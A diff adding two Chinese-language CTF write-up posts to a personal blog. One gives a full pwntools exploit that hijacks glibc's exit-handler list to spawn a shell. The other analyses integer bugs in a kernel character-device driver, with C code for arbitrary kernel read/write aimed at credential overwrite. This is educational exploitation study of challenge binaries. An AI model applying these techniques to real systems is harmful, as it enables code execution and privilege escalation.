@@ -327,6 +327,364 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/07/roarctf-2a1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xkaneiki">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xkaneiki's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/12/07/roarctf-2a1/" class="post-title-link" itemprop="url">roarctf_2a1</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-12-07 10:51:24 / Modified: 22:54:10" itemprop="dateCreated datePublished" datetime="2020-12-07T10:51:24+08:00">2020-12-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="2a1"><a href="#2a1" class="headerlink" title="2a1"></a>2a1</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 上午10.54.30.png" alt="截屏2020-12-07 上午10.54.30"></p>
+<p>程序的主要功能有3个：</p>
+<ul>
+<li><p>程序首先会给你alarm的地址，用它可以求出libc的基址</p>
+</li>
+<li><p>程序会讲你指定的地址上的八个字节输出出来</p>
+</li>
+<li><p>你先制定一个地址，程序申请0x30的堆栈空间，你可以向里面输入东西，然后程序通过30行的*v8=v9将堆地址写到你制定的地址上</p>
+</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>一开始想伪造vtable，利用IO_overflow来执行gadget，后来发现没发饶过执行IO_overflow的条件。请教了学长之后才有了思路。</p>
+<p>程序正常退出时或exit时会执行__run_exit_handlers函数，这个函数里面有东西可以利用。查看glibc的源码，可以看到struct exit_function_list <em>cur = </em>listp;，我们可以通过劫持这个指针，因为这个指针指向的结构体里面有函数指针并且之后的步骤会执行case ef_cxa:cxafct = f-&gt;func.cxa.fn;，我们可以利用此来执行system(‘/bin/sh’)获得shell。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="keyword">int</span> status, struct exit_function_list **listp,</span><br><span class="line">		     <span class="keyword">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit' and `on_exit'. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> = *<span class="title">listp</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line"><span class="class">	    &amp;<span class="title">cur</span>-&gt;<span class="title">fns</span>[--<span class="title">cur</span>-&gt;<span class="title">idx</span>];</span></span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">	      <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">	      <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      atfct ();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don't free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下这个结构体的结构，我们劫持了cur指针就能够指向我们伪造的exit_function_list，由于可以想任意的地址写上堆地址，我们可以覆盖cur指针为堆地址，将fn设置为system，将arg设置为/bin/sh，然后执行cxafct (f-&gt;func.cxa.arg, status);就够获得shell了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour' should be of type of the `enum' above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int'.  */</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> flavor;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">void</span> (*at) (<span class="keyword">void</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="keyword">void</span> (*fn) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">	    <span class="keyword">void</span> *arg;</span><br><span class="line">	  &#125; on;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="keyword">void</span> (*fn) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line">	    <span class="keyword">void</span> *arg;</span><br><span class="line">	    <span class="keyword">void</span> *dso_handle;</span><br><span class="line">	  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+<p>接下来我们进行调试，在__run_exit_handlers设置下断点，看看这个函数的执行情况。</p>
+<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.26.07.png" alt="截屏2020-12-07 下午3.26.07"></p>
+<p>参考源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数的第二个参数即rsi是&amp;__exit_funcs，则rbp是固定的值即&amp;__exit_funcs，而r13的值是通过rbp取址的，从而如果我们能够改写__exit_funcs的内容则就能偶控制r13。</p>
+<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.31.36.png" alt="截屏2020-12-07 下午3.31.36"></p>
+<p>从这里可以看出r13存储的就是lisp，我们利用程序的在任意地址写上我们申请的堆地址的功能，将堆地址写到&amp;__exit_funcs处，从而就能够劫持cur。</p>
+<p>由于我们可以往堆内写任意的内容，我们按照exit_function_list结构体将idx设置为0，将fns[0].flavor设置为4，函数就会跳过去执行一下内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br></pre></td></tr></table></figure>
+<p>我们再设置f-&gt;func.cxa.fn和f-&gt;func.cxa.arg就能够完成劫持，但是这里的函数地址是要经过一些操作才能获得的，进入gdb我们看看具体是什么</p>
+<p><img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午3.40.41.png" alt="截屏2020-12-07 下午3.40.41"></p>
+<p>在call之前，函数地址会现经过循环右移0x11，再和fs:[0x30]异或。想要控制调用的函数就知道fs:[0x30]的值。可以利用之前读任意地址的操作获得，现在的问题是fs[0x30]指向哪里？参考<a href="https://stackoverflow.com/questions/23095665/using-gdb-to-read-msrs" target="_blank" rel="noopener">这篇回答</a>，在gdb中输入call arch_prctl(0x1003, $rsp - 0x8)然后再 x /gx $rsp - 0x8打印出结果，计算出fs:[0x30]和libc的相对偏移；<img src="/2020/12/07/roarctf-2a1/截屏2020-12-07 下午10.50.32.png" alt="截屏2020-12-07 下午10.50.32"></p>
+<p>根据相对偏移利用之前的任意读读出fs:[0x30]中的内容guard，要想再经过ror和xor操作后得到正确system地址，只需要将system地址先进行xor然后再进行循rol循环左移就行了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROL((gadget+libc)^guard,<span class="number">0x11</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span><span class="params">(data, shift, size=<span class="number">64</span>)</span>:</span></span><br><span class="line">    shift %= size</span><br><span class="line">    remains = data &gt;&gt; (size - shift)</span><br><span class="line">    body = (data &lt;&lt; shift) - (remains &lt;&lt; size)</span><br><span class="line">    <span class="keyword">return</span> (body + remains)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./2+1'</span>)</span><br><span class="line">le = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">gadget = le.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">' dir ../glibc-2.23/io\n'</span></span><br><span class="line">cmd += <span class="string">' dir ../glibc-2.23/libio\n'</span></span><br><span class="line">cmd += <span class="string">'dir ../glibc-2.23/stdlib\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b _IO_flush_all_lockp\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b __cxa_thread_atexit_impl\n'</span></span><br><span class="line"><span class="comment"># cmd += 'b __call_tls_dtors\n'</span></span><br><span class="line">cmd += <span class="string">'b __run_exit_handlers\n'</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Gift: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)-le.sym[<span class="string">'alarm'</span>]</span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line">print(hex(gadget+libc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = libc + le.sym['environ']</span></span><br><span class="line">t = libc+<span class="number">0x5df730</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"where to read?:"</span>)</span><br><span class="line">p.send(p64(t))</span><br><span class="line">p.recvuntil(<span class="string">"data: "</span>)</span><br><span class="line">guard=u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">print(<span class="string">'guard'</span>, hex(guard))</span><br><span class="line">print(<span class="string">"t"</span>, hex(t))</span><br><span class="line"></span><br><span class="line">t=libc + <span class="number">0x7f3de3c355f8</span><span class="number">-0x7f3de3871000</span></span><br><span class="line">p.recvuntil(<span class="string">"where to write?:"</span>)</span><br><span class="line">p.send(p64(t))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"msg: "</span>)</span><br><span class="line">sh = libc+<span class="number">0x18CE17</span></span><br><span class="line">payload= p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">4</span>)+p64(ROL((gadget+libc)^guard,<span class="number">0x11</span>))+p64(sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/23/xyb-babydev/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xkaneiki">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xkaneiki's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2020/11/23/xyb-babydev/" class="post-title-link" itemprop="url">xyb_babydev</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-11-23 20:45:35" itemprop="dateCreated datePublished" datetime="2020-11-23T20:45:35+08:00">2020-11-23</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-12-07 22:59:20" itemprop="dateModified" datetime="2020-12-07T22:59:20+08:00">2020-12-07</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="babydev详解"><a href="#babydev详解" class="headerlink" title="babydev详解"></a>babydev详解</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先打开文件系统查看初始化的脚本<code>init</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod mychrdev.ko</span><br><span class="line">chmod 777 /dev/mychrdev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<p>发现程序加载了一个<code>mychrdev.ko</code>的模块，漏洞就应该在这个内核模块中。看名字应该是一个字符设备的驱动程序。</p>
+<p>将这个模块从文件系统中拷贝出来，用IDA打开它，进行分析。可以看到程序主要有几个主要的函数<code>llseek</code>，<code>read</code>，<code>write</code>，<code>open</code>，<code>ioctl</code>。</p>
+<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午8.57.36.png" alt="截屏2020-11-23 下午8.57.36" style="zoom:50%;"></p>
+<p>结合模块的名字大致能知道每个函数的作用，<code>read</code>，<code>write</code>，<code>open</code>就是重写了<code>orw</code>操作，<code>ioctl</code>大概是它自定义了一个操作，<code>llseek</code>实现的就是重定位读写指针的功能。</p>
+<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.06.01.png" alt="截屏2020-11-23 下午9.06.01"></p>
+<p>这个函数通过<code>0x1111</code>命令泄漏了一些信息给我们。通过它我们能知道<code>v9</code>,<code>v10</code>,<code>v11</code>,<code>v12</code>和<code>md</code>的值。通过分析我们知道<code>v9</code>是当前的进程号，<code>v10</code>是当前程序的名称，<code>v11</code>,<code>v12</code>缓冲区的一些信息，<code>md</code>则直接将缓冲区的地址<code>mydata</code>告诉了我们。</p>
+<h3 id="read，write-amp-amp-llseek"><a href="#read，write-amp-amp-llseek" class="headerlink" title="read，write &amp;&amp; llseek"></a><code>read</code>，<code>write</code> &amp;&amp; <code>llseek</code></h3><p>驱动程序主要维护三个值，一个是文件的读写指针，没次打开文件的时候都会被重新设置为0；文件的头指针，指向文件内容开始的地方，它存放在<code>mydata+0x10000</code>中，表示文件内容的起始地址相对于<code>mydata</code>的偏移；三是文件的大小，它存放在<code>mydata+0x1008</code>中。</p>
+<p>在<code>llseek</code>中可以重制文件指针的值，并且返回重制以后文件指针的值。它有三种模式</p>
+<ul>
+<li>当<code>mod==0</code>时，会重制文件指针为<code>a2</code></li>
+<li>当<code>mod==1</code>时，将文件指针跳转到<code>当前地址+a2</code>的位置</li>
+<li>当<code>mod==2</code>时，会将指针跳到文件倒数第<code>|a2|</code>（这里a2要是个负数）个位置</li>
+</ul>
+<p><strong>这里可以看到<code>llseek</code>无法将文件指针设置为一个负数。</strong></p>
+<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.05.34.png" alt="截屏2020-11-23 下午9.05.34"></p>
+<p>查看<code>read</code>函数，在<code>copy_to_user</code>函数第二个参数<code>s_n + base + mydata</code>表示要拷贝的内核空间的地址，这里存在一个整型漏洞，<code>s_n+base</code>是负数的时候就可以跳转到<code>my_data</code>之前的地址。其中s_n是文件指针的值，我们无法通过<code>llseek</code>将其设置为负数，<strong>因此要想跳到<code>my_data</code>之前的位置进行操作要考虑在<code>base</code>上（<code>mydata+0x10000</code>）做文章</strong>。</p>
+<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.05.53.png" alt="截屏2020-11-23 下午9.05.53"></p>
+<p>查看write函数，发现其同样存在整型漏洞，只要能将<code>my_data+0x10000</code>的位置，设置为负数就能够对mydata之前的地址进行操作。</p>
+<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.06.19.png" alt="截屏2020-11-23 下午9.06.19"></p>
+<p>仔细观察发现write还有一个漏洞。<code>*(_QWORD *)(mydata + 0x10008) += n;</code>每次写成功之后都会吧写的内容的大小加到<code>mydata + 0x10008</code>上，和<code>llseek</code>配合就能够使得<code>mydata+0x10008</code>值超过<code>0x10000</code>，使得我们能够通过<code>write</code>随意修改<code>mydata+0x10000</code>和<code>mydata+0x10008</code>上的内容，从而实现对任意地址的读写操作。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先为了绕过<code>write</code>的检查，先写<code>0x10000</code>的内容，再将文件指针设置为<code>0</code>，再写<code>0x10000</code>的内容上去使得<code>my_data+0x10008</code>的值变成0x20000，这样就能随意写<code>my_data+0x10000</code>和<code>my_data+0x10008</code>的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    u_char buf[<span class="number">0x10010</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> n = write(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br></pre></td></tr></table></figure>
+<p>然后我们就能够对任意地址进行读写，因为进程的<code>cred</code>结构在<code>mydata</code>之前，我们就主要跳到<code>mydata</code>之前进行操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line"><span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">n = lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// printf("%d\n", n);</span></span><br><span class="line">n = read(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line"><span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure>
